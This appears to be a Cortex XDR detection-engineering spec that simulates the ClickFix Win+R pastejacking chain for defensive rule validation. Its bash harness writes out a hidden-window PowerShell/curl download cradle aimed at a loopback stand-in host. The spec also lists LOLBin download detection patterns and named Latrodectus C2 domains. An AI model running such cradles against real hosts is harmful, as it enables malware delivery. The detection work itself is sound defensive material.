identity.name: ClickFix Pastejacking: RunMRU-to-explorer.exe-Parented Interpreter Execution ABIOC (T1204.004 / T1059.001 / T1105)
identity.summary: ClickFix lures a user into pasting an attacker command into the Windows Run dialog (Win+R). The paste seeds a RunMRU registry cradle and runs parented by explorer.exe — not a browser or console — launching a PowerShell/mshta downloader whose LOLBin child fetches a remote payload. No single hop is a known-bad IOC; the ABIOC scores the whole causality chain as one user-execution incident.
identity.description: This is the first ENDPOINT user-execution ABIOC in the corpus: it exercises Cortex's auto-tuned Analytics Behavioral IOC class against the ClickFix / pastejacking initial-access-to-execution vector Unit 42 observed across roughly a dozen incident-response engagements (Lumma Stealer, Latrodectus, NetSupport RAT delivery). ClickFix is a clipboard-hijack social-engineering play: a malicious page (fake DocuSign/Okta/Cloudflare verification lures) writes an obfuscated command to the clipboard and instructs the victim to press Win+R and paste-and-run it. The paste-execution leaves two behavioral seams a static signature cannot generalize over. First, the Windows Run dialog records the pasted command under HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU, so a download cradle (curl/powershell/mshta/http tokens) appears in that MRU key. Second — and this is the durable seam — the interpreter that runs is parented directly by explorer.exe (the Run-dialog handler) with NO browser or console-host ancestry, which is the signature of a human paste-execution rather than a script, scheduled task, or console session. From there the interpreter fetches a remote payload via a LOLBin (curl.exe, certutil.exe, mshta.exe, extrac32.exe, rundll32.exe, bitsadmin.exe, msiexec.exe) — often an encrypted .bin — closing the chain to a network egress the NGFW also sees. A hand-authored BIOC keyed on one bad binary or command string misses this because every executable in the chain is legitimate and the command content is polymorphic; the ABIOC fires on the deviation-plus-causality (RunMRU paste cradle -> explorer-parented interpreter with remote-fetch args -> LOLBin download) and anchors it to the explorer.exe process instance. Three ABIOCs cover the three seams (registry paste cradle, explorer-parented interpreter, LOLBin remote fetch); two validation XQLs confirm the process lineage in xdr_data and the payload egress on the NGFW; and a correlation rule stitches the ABIOCs and the network egress into a single ClickFix user-execution incident spanning the EDR and NDR planes — the causality-stitch proof a DC presents that Cortex caught operator-paced user execution no static rule was written for.

campaigns: ClickFix / pastejacking initial-access campaigns delivering Lumma Stealer, Latrodectus, and NetSupport RAT (2024-2025)

execution.framework_reference_id: SIM-EDR-016 — ClickFix RunMRU-to-explorer.exe-parented interpreter chain modelled NON-DESTRUCTIVELY for Cortex ABIOC validation.

prerequisites.description: Cortex XDR / XSIAM agent installed on the target host so per-process, registry, and command telemetry reaches xdr_data.
A baseline window has elapsed so Cortex learned the endpoint's normal Run-dialog / interpreter-parentage behaviour (explorer.exe rarely parents an interpreter that then fetches a remote payload).

payload.code:
# Non-destructive SAFE-MODE model of the ClickFix RunMRU -> explorer-parented
# interpreter -> LOLBin remote-fetch chain. The technique is Windows; this model
# runs on the Linux jumpbox harness. It writes benign SAFE-MODE marker files that
# stand in for the RunMRU registry entry and the pasted download cradle, runs a
# representative interpreter command lineage, and fetches from an AUTHORISED
# loopback host (never a real C2). No registry is written, nothing is installed,
# and no real payload is fetched or executed.
set -euo pipefail
MARKER_DIR="${MARKER_DIR:-/tmp/cortexsim-edr-016}"
C2_HOST="${C2_HOST:-127.0.0.1}"
mkdir -p "$MARKER_DIR"
# (1) RunMRU paste cradle — benign marker standing in for the HKCU RunMRU value.
printf '%s\n' 'CortexSim SAFE-MODE marker SIM-EDR-016 RunMRU value: powershell -w hidden -c "curl.exe http://127.0.0.1/update.bin -o %TEMP%\\a.bin"' > "$MARKER_DIR/runmru.marker"
# (2) explorer.exe-parented interpreter command lineage (representative, benign).
for c in 'whoami' 'hostname' 'id'; do sh -c "$c" >/dev/null 2>&1 || true; done
# (3) LOLBin remote fetch of an encrypted .bin from an authorised loopback host.
curl -s --max-time 5 "http://${C2_HOST}/update.bin" -o "$MARKER_DIR/a.bin" 2>/dev/null || true
echo '[CortexSim] SIM-EDR-016 ClickFix SAFE-MODE model complete.'

input_variables.description: Directory the benign SAFE-MODE marker files are written into.

abiocs.name: EDR-016 RunMRU Paste-Execution Seeding an Interpreter Download Cradle
abiocs.description: A value under the Windows Run-dialog RunMRU key is written whose data carries a download cradle (http / curl / powershell / mshta tokens). This is the earliest ClickFix seam: the paste-execution the victim performed via Win+R is recorded in the MRU. The ABIOC fires on a RunMRU value that carries remote-fetch content, anchored to the paste that immediately precedes an explorer-parented interpreter, not on any known-bad command string.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.REGISTRY
| filter action_registry_key_name contains "\\Explorer\\RunMRU"
| filter (action_registry_data contains "powershell" or action_registry_data contains "mshta" or action_registry_data contains "curl" or action_registry_data contains "certutil") and (action_registry_data contains "http" or action_registry_data contains "DownloadString" or action_registry_data contains "iwr" or action_registry_data contains "-enc")
| comp count() as runmru_download_cradles by agent_hostname, actor_effective_username
| filter runmru_download_cradles >= 1
| fields agent_hostname, actor_effective_username, runmru_download_cradles
abiocs.causality_anchor: Learned Run-dialog baseline (users rarely paste a download cradle into Win+R) -> RunMRU value carrying http/curl/powershell tokens -> the explorer-parented interpreter launched from that paste, anchored to the paste event.

abiocs.name: EDR-016 explorer.exe-Parented Interpreter Launched with Remote-Fetch Arguments
abiocs.description: An interpreter (powershell.exe / cmd.exe / mshta.exe / wscript.exe) is parented DIRECTLY by explorer.exe with a command line carrying remote-fetch arguments (http / curl / DownloadString / iwr) and no browser or console-host ancestry. explorer.exe is the Run-dialog handler, so this parentage is the signature of a human paste-execution rather than a script, scheduled task, or console session. The ABIOC scores the deviation-plus-causality, catching a chain in which every binary is legitimate.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "explorer.exe" and causality_actor_process_image_name = "explorer.exe"
| filter action_process_image_name in ("powershell.exe", "cmd.exe", "mshta.exe", "wscript.exe")
| filter action_process_command_line contains "http" or action_process_command_line contains "curl" or action_process_command_line contains "DownloadString" or action_process_command_line contains "iwr"
| comp count() as paste_exec_launches by agent_hostname, causality_actor_process_instance_id, action_process_image_name
| filter paste_exec_launches >= 1
| fields agent_hostname, causality_actor_process_instance_id, action_process_image_name, paste_exec_launches
abiocs.causality_anchor: RunMRU paste-execution -> explorer.exe (Run-dialog handler, no browser/console parent) -> interpreter with remote-fetch arguments, anchored to the explorer.exe process instance.

abiocs.name: EDR-016 Interpreter-Spawned LOLBin Fetching a Remote Payload
abiocs.description: The paste-launched interpreter (powershell.exe / cmd.exe / mshta.exe) spawns a living-off-the-land binary (curl.exe, certutil.exe, extrac32.exe, rundll32.exe, msiexec.exe, bitsadmin.exe) whose command line fetches a remote payload — often an encrypted .bin. Every LOLBin is legitimate; the ABIOC fires on an interpreter parented by explorer.exe spawning a downloader LOLBin, anchored to the paste-execution causality chain rather than to a specific payload URL.
abiocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name in ("powershell.exe", "cmd.exe", "mshta.exe")
| filter causality_actor_process_image_name = "explorer.exe"
| filter action_process_image_name in ("curl.exe", "certutil.exe", "extrac32.exe", "rundll32.exe", "msiexec.exe", "bitsadmin.exe")
| filter action_process_command_line contains "http" or action_process_command_line contains "urlcache" or action_process_command_line contains ".bin"
| comp count() as lolbin_remote_fetches by agent_hostname, causality_actor_process_instance_id, action_process_image_name
| filter lolbin_remote_fetches >= 1
| fields agent_hostname, causality_actor_process_instance_id, action_process_image_name, lolbin_remote_fetches
abiocs.causality_anchor: explorer-parented interpreter -> LOLBin downloader spawn (curl/certutil/mshta) fetching a remote .bin payload, anchored to the same paste-execution causality chain.

xql_queries.name: EDR-016 explorer.exe-Parented Interpreter Surfaced in Process Telemetry
xql_queries.query:
dataset = xdr_data
| filter _time > to_timestamp(current_time() - 900)
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter actor_process_image_name = "explorer.exe"
| filter action_process_image_name in ("powershell.exe", "cmd.exe", "mshta.exe", "wscript.exe")
| comp count() as explorer_interpreter_launches by agent_hostname
| filter explorer_interpreter_launches >= 1
| fields agent_hostname, explorer_interpreter_launches

xql_queries.name: EDR-016 Remote Payload Fetch to Latrodectus C2 Surfaced on the NGFW
xql_queries.query:
dataset = pan_ngfw_traffic
| filter _time > to_timestamp(current_time() - 900)
| filter app = "web-browsing" or app = "ssl"
| filter dst_host in ("webbs.live", "diab.live", "mhbr.live")
| comp count() as remote_payload_fetches by source_ip, dst_host
| filter remote_payload_fetches >= 1
| fields source_ip, dst_host, remote_payload_fetches

correlation_rules.name: ClickFix Paste-Execution Chain — RunMRU to explorer-Parented Interpreter to LOLBin Fetch (ABIOC Causality Stitch)
correlation_rules.logic: ABIOC(EDR-016 RunMRU Paste-Execution Seeding an Interpreter Download Cradle) AND ABIOC(EDR-016 explorer.exe-Parented Interpreter Launched with Remote-Fetch Arguments) AND (ABIOC(EDR-016 Interpreter-Spawned LOLBin Fetching a Remote Payload) OR XQL(EDR-016 Remote Payload Fetch to Latrodectus C2 Surfaced on the NGFW)) on the same agent_hostname within the paste-execution window — fuses the RunMRU download cradle, the explorer-parented interpreter with no browser or console parentage, and the remote-fetch LOLBin/NGFW egress into a single ClickFix user-execution incident spanning the EDR and NDR planes, anchored to the explorer.exe process instance.

preventive_controls: Disable or restrict the Windows Run dialog (Win+R) for standard users via Group Policy (NoRun) so paste-execution is blocked, not merely detected.
Deploy Advanced URL Filtering and DNS Security to block the ClickFix lure pages and Latrodectus/.live C2 domains before the fetch completes.
Deliver user-awareness training on ClickFix 'verify you are human / fix this error' paste lures (fake DocuSign/Okta/Cloudflare pages).
detection_engineering: Let Cortex auto-tune ABIOCs on process parentage and command-line intent rather than hand-authoring static rules for individual LOLBins or C2 URLs.
Alert on explorer.exe directly parenting a script interpreter whose command line carries remote-fetch arguments and that has no browser or console-host ancestry.
Hunt RunMRU registry values for download cradles (http/curl/powershell/mshta tokens) and correlate with the interpreter launch that follows.
